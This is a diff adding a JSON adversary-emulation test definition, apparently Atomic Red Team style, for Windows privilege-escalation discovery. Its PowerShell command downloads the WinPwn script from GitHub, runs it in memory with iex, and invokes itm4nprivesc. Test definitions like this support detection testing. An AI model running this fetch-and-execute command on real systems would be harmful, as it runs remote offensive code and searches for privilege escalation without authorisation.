@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - itm4nprivesc",
+    "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1082",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "System Information Discovery",
+    "source": "ART",
+    "uuid": "3d256a2f-5e57-4003-8eb6-64d91b1da7ce",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
